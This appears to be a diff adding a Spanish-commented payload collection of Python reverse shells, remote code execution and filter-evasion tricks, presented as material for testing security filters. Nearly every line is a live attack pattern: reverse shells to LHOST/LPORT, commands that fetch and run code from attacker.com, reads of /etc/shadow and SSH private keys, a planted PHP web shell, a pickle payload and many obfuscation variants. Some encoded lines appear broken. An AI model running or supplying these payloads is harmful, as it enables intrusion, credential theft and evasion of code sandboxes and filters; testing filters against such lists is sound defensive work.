@@ -1,0 +1,254 @@
+# Patrones Avanzados de Reverse Shell y RCE en Python
+# Para detección y testing iterativo de filtros de seguridad
+
+## REVERSE SHELL - Patrones Base
+import socket,os,pty;s=socket.socket();s.connect(("LHOST",LPORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])
+a=__import__;b=a("socket").socket;p=a("subprocess").call;o=a("os").dup2;s=b();s.connect(("LHOST",LPORT));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(["/bin/sh","-i"])
+import os,socket,subprocess;s=socket.socket();s.connect(("LHOST",LPORT));os.system("exec /bin/bash 0<&3 1>&3 2>&3")
+os.system("bash -i >& /dev/tcp/LHOST/LPORT 0>&1")
+
+## REVERSE SHELL - Con Archivo Descriptor
+import socket;s=socket.socket();s.connect(("LHOST",LPORT));os.system("sh 0<&3 1>&3 2>&3")
+import socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),3);os.system("sh 0<&3 1>&3 2>&3")
+import os,socket;s=socket.socket();s.connect(("LHOST",LPORT));os.system("/bin/bash 0<&%d 1>&%d 2>&%d"%((s.fileno(),s.fileno(),s.fileno())))
+
+## REVERSE SHELL - Con Import Dinámico
+__import__("socket").socket().connect(("LHOST",LPORT));__import__("os").dup2(__import__("socket").socket().fileno(),0);__import__("os").dup2(__import__("socket").socket().fileno(),1);__import__("os").dup2(__import__("socket").socket().fileno(),2);__import__("subprocess").call(["/bin/sh","-i"])
+(__import__("socket").socket().connect(("LHOST",LPORT)),__import__("os").dup2(__import__("socket").socket().fileno(),0),__import__("os").dup2(__import__("socket").socket().fileno(),1),__import__("os").dup2(__import__("socket").socket().fileno(),2),__import__("subprocess").call(["/bin/sh","-i"]))[-1]
+
+## REVERSE SHELL - Usando Popen
+from subprocess import Popen;s=__import__("socket").socket();s.connect(("LHOST",LPORT));Popen(["/bin/sh","-i"],stdin=s,stdout=s,stderr=s)
+import subprocess,socket;s=socket.socket();s.connect(("LHOST",LPORT));subprocess.Popen(["/bin/bash","-i"],stdin=s,stdout=s,stderr=s)
+
+## REVERSE SHELL - Con select() para I/O bidireccional
+import socket,subprocess,select;s=socket.socket();s.connect(("LHOST",LPORT));p=subprocess.Popen(["/bin/sh","-i"],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE);while 1:r,w,x=select.select([s,p.stdout],[],[]);[s.send(p.stdout.read(1024))if x in r else 0,p.stdin.write(s.recv(1024))if s in r else 0]
+
+## REVERSE SHELL - UDP
+import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.sendto(b"",("LHOST",LPORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")
+
+## REVERSE SHELL - Con timeout y retry
+import socket,time;s=socket.socket();s.settimeout(3);s.connect(("LHOST",LPORT)) if s else [time.sleep(5),__import__("subprocess").call(["/bin/sh","-i"],stdin=s,stdout=s,stderr=s)]
+
+## RCE - Command Execution Simple
+import os;os.system("id")
+import subprocess;subprocess.call(["ls","-la"])
+import subprocess;subprocess.run(["whoami"])
+__import__("os").system("uname -a")
+__import__("subprocess").call(["cat","/etc/passwd"])
+
+## RCE - Con Shell=True (Más peligroso)
+import subprocess;subprocess.call("id",shell=True)
+import subprocess;subprocess.run("cat /etc/shadow",shell=True)
+__import__("subprocess").call("curl http://attacker.com/shell.sh|bash",shell=True)
+os.system("bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'")
+
+## RCE - Usando exec/eval
+exec("import os;os.system('id')")
+eval("__import__('os').system('whoami')")
+exec("""import subprocess
+subprocess.call(['bash','-c','id'])""")
+
+## RCE - Con Base64 Encoding
+import base64;exec(base64.b64decode("aW1wb3J0IG9zO29zLnN5c3RlbSgnaWQnKQ=="))
+eval(base64.b64decode(b"X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2lkJykk"))
+
+## RCE - Con Hex Encoding
+import binascii;exec(binascii.unhexlify("696d706f72742069733b69732e73797374656d28276964')"))
+exec(bytes.fromhex("696d706f72742069733b69732e73797374656d28276964')"))
+
+## RCE - Descarga y Ejecución Remota
+import urllib.request;urllib.request.urlopen("http://attacker.com/script.py").read()
+import requests;exec(requests.get("http://attacker.com/malware").text)
+import socket;s=socket.socket();s.connect(("attacker.com",80));s.send(b"GET /shell.py HTTP/1.0\r\n\r\n");exec(s.recv(4096))
+
+## RCE - File Read (Post-Exploitation)
+open("/etc/passwd").read()
+open("/etc/shadow").read()
+open("/root/.ssh/id_rsa").read()
+open("/proc/self/environ").read()
+
+## RCE - Write File
+open("/tmp/pwned","w").write("owned")
+open("/var/www/html/shell.php","w").write("<?php system($_GET['cmd']); ?>")
+
+## PATRONES DE EVASIÓN - Unicode Escapes
+exec("os\x2esystem('id')")
+__import__('os').system('\x69\x64')
+exec('\u006f\u0073.system("\u0069\u0064")')
+
+## PATRONES DE EVASIÓN - Null Bytes
+exec("__import__\x00('os').system('id')")
+os.system("id\x00#fake")
+
+## PATRONES DE EVASIÓN - String Concatenation
+os.system("i"+"d")
+__import__("o"+"s").system("w"+"h"+"o"+"a"+"m"+"i")
+
+## PATRONES DE EVASIÓN - chr() Function
+os.system(chr(105)+chr(100))
+__import__(chr(111)+chr(115)).system(chr(105)+chr(100))
+
+## PATRONES DE EVASIÓN - Alternativos de os.system()
+import os;os.system("id")
+from os import system;system("id")
+import os as o;o.system("id")
+from os import *;system("id")
+
+## PATRONES DE EVASIÓN - Subprocess Alternativas
+import subprocess;subprocess.call(["id"])
+import subprocess;subprocess.Popen(["id"])
+import subprocess;subprocess.run(["id"])
+from subprocess import call;call(["id"])
+from subprocess import *;call(["id"])
+
+## PATRONES DE EVASIÓN - Importlib
+import importlib;importlib.import_module("os").system("id")
+__import__("importlib").import_module("subprocess").call(["id"])
+
+## PATRONES DE EVASIÓN - getattr()
+getattr(__import__("os"),"system")("id")
+getattr(__import__("subprocess"),"call")(["id"])
+
+## PATRONES DE EVASIÓN - globals()/locals()
+globals()["__builtins__"]["__import__"]("os").system("id")
+locals()["__builtins__"]["eval"]("__import__('os').system('id')")
+
+## PATRONES DE EVASIÓN - Lambda/Function Pointers
+(lambda:__import__("os").system("id"))()
+list(map(lambda x:__import__("os").system("id"),[1]))[0]
+
+## PATRONES DE EVASIÓN - Walrus Operator (Python 3.8+)
+(x:=__import__("os")).system("id")
+(cmd:="id") and __import__("os").system(cmd)
+
+## PATRONES DE EVASIÓN - List Comprehension
+[__import__("os").system("id") for _ in [1]]
+{__import__("os").system("id") for _ in [1]}
+
+## PATRONES DE EVASIÓN - Dictionary Unpacking
+{**{"a":__import__("os").system("id")}}
+
+## PATRONES DE EVASIÓN - Format Strings
+"{0.__class__.__bases__[0].__subclasses__()[104].__init__.__globals__['system']('id')}".format(object)
+f"{__import__('os').system('id')}"
+
+## PATRONES DE EVASIÓN - Type Object Abuse
+type("c",(object,),{"exec":lambda s:__import__("os").system("id")})().exec()
+
+## PATRONES DE EVASIÓN - AST/Compile
+compile("__import__('os').system('id')","<string>","exec")
+eval(compile("__import__('os').system('id')","<string>","eval"))
+
+## PATRONES DE EVASIÓN - Code Object
+code=compile("import os;os.system('id')","<string>","exec");exec(code)
+
+## PATRONES DE EVASIÓN - __import__ con índices
+__import__("os").__dict__["system"]("id")
+__import__("os").__getattribute__("system")("id")
+
+## PATRONES DE EVASIÓN - Encoding Cadenas
+import codecs;codecs.decode("b3M=\"","rot_13").system("id")
+import base64;exec(base64.urlsafe_b64decode("X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2lkJyk="))
+
+## PATRONES DE EVASIÓN - Ofuscación con variables
+s="import os;os.system('id')";exec(s)
+cmd="id";__import__("os").system(cmd)
+
+## PATRONES DE EVASIÓN - Ofuscación con comentarios
+import os#real
+;os.system('id')#fake
+
+## PATRONES DE EVASIÓN - Saltos de línea
+import os\nos.system('id')
+import os;os.system(
+'id')
+
+## PATRONES DE EVASIÓN - Slicing
+__import__("os")[0:2]+"".system("id")
+"__import__"[0:10]("os").system("id")
+
+## PATRONES DE EVASIÓN - Reversing
+"o"+"s"[::-1]  # reversa de 's' = 's'
+reversed_import = "tropmi__"[::-1];__import__(reversed_import)("os").system("id")
+
+## PATRONES DE EVASIÓN - Hex/Oct/Bin Literals
+os.system(0o151, 0o144)  # octal de 'id'
+os.system(bytes([105,100]))  # bytes de 'id'
+
+## PATRONES DE EVASIÓN - Exec con múltiples contextos
+exec("a=__import__('os');a.system('id')")
+exec("exec(__import__('os').system('id'))")
+
+## REVERSE SHELL - Usando threading
+import threading,socket,os;s=socket.socket();s.connect(("LHOST",LPORT));t=threading.Thread(target=os.dup2,args=(s.fileno(),0));t.start();os.system("/bin/sh")
+
+## REVERSE SHELL - Usando queue
+import queue,socket,subprocess,threading;s=socket.socket();s.connect(("LHOST",LPORT));q=queue.Queue();t=threading.Thread(target=lambda:subprocess.call(["/bin/sh","-i"],stdin=s,stdout=s,stderr=s));t.start()
+
+## REVERSE SHELL - Con pty.spawn alternativas
+import pty,socket,os;s=socket.socket();s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")
+
+## REVERSE SHELL - Usando os.execvp
+import socket,os;s=socket.socket();s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.execvp("/bin/sh",["sh"])
+
+## REVERSE SHELL - Con stdin/stdout/stderr
+import socket,subprocess;s=socket.socket();s.connect(("LHOST",LPORT));p=subprocess.Popen(["/bin/bash"],stdin=s,stdout=s,stderr=s)
+
+## REVERSE SHELL - Con socat simulado en Python
+import socket,subprocess;s=socket.socket();s.connect(("LHOST",LPORT));exec("subprocess.Popen(['/bin/sh','-i'],stdin=s,stdout=s,stderr=s)")
+
+## RCE - Inyección en procesos existentes (ptrace-like)
+import ctypes,os;libc=ctypes.CDLL("libc.so.6");libc.system(b"id")
+
+## RCE - Usando dlopen/dlsym
+import ctypes;lib=ctypes.CDLL(None);system=lib.system;system(b"id")
+
+## RCE - Con ctypes y bibliotecas externas
+import ctypes,os;bash=ctypes.CDLL("/bin/bash");bash.main(0,[b"/bin/bash",b"-c",b"id"])
+
+## RCE - Usando syscalls directas
+import os;os.execve("/bin/sh",["/bin/sh","-c","id"],os.environ)
+
+## RCE - Con os.fork()
+import os;pid=os.fork();if pid==0:os.execvp("/bin/sh",["sh","-c","id"])
+
+## RCE - Con pty.spawn en subproceso
+import os,pty;os.fork()and pty.spawn("/bin/sh")or os.system("id")
+
+## REVERSE SHELL - Con encoding múltiple
+a=__import__;b=a('socket');c=b.socket;d=c();d.connect((bytes([76,72,79,83,84]),80));e=a('subprocess');f=e.call;g=["/bin/sh","-i"];f(g,stdin=d,stdout=d,stderr=d)
+
+## RCE - Con obfuscación de strings encadenados
+import os;os.system("".join(["i","d"]))
+import os;cmd="".join(chr(x) for x in [105,100]);os.system(cmd)
+
+## RCE - Con rot13 encoding
+import codecs;exec(codecs.encode("vzcbeg b\nb.flfgrz('vq')","rot_13"))
+
+## RCE - Con XOR encoding
+payload=bytes([x^0xFF for x in b"import os;os.system('id')"]);exec(bytes([x^0xFF for x in payload]))
+
+## REVERSE SHELL - Con múltiples puertos fallback
+import socket;s=socket.socket();[s.connect(("LHOST",p)) for p in [4242,4243,4244,4245] if not [None for fd in (0,1,2) if not __import__("os").dup2(s.fileno(),fd)][-1]][0]or __import__("subprocess").call(["/bin/sh","-i"])
+
+## REVERSE SHELL - Con retry logic
+import socket,time;[1 for _ in range(5) if (lambda:socket.socket().connect(("LHOST",LPORT)))() or time.sleep(2)]
+
+## RCE - Con FIFO pipes
+import os;os.mkfifo("/tmp/f");os.system("cat </tmp/f|/bin/sh >/tmp/f 2>&1 &");open("/tmp/f","w").write("id\n")
+
+## RCE - Con named sockets
+import socket,subprocess;s=socket.socket(socket.AF_UNIX);s.bind("/tmp/shell");subprocess.Popen(["/bin/sh","-i"],stdin=s,stdout=s,stderr=s)
+
+## RCE - Con mensaje cueing
+import multiprocessing;q=multiprocessing.Queue();q.put(__import__("os").system("id"))
+
+## RCE - Con pickling de objetos
+import pickle,os;pickle.loads(b"cos\nsystem\n(S'id'\ntR.")
+
+## RCE - Con marshal
+import marshal;exec(marshal.loads(b'\x64\x00\x64\x01\x6b\x02\x5a\x00d\x01S\x00e\x00d\x01\x83\x01\x01\x00'))
+
+## PATRONES DE EVASIÓN - Con bytecode
+import types;code=types.CodeType(0,0,0,0,0,0,b'd\x00S\x00',(),(),(),'','',1,b'');exec(code)
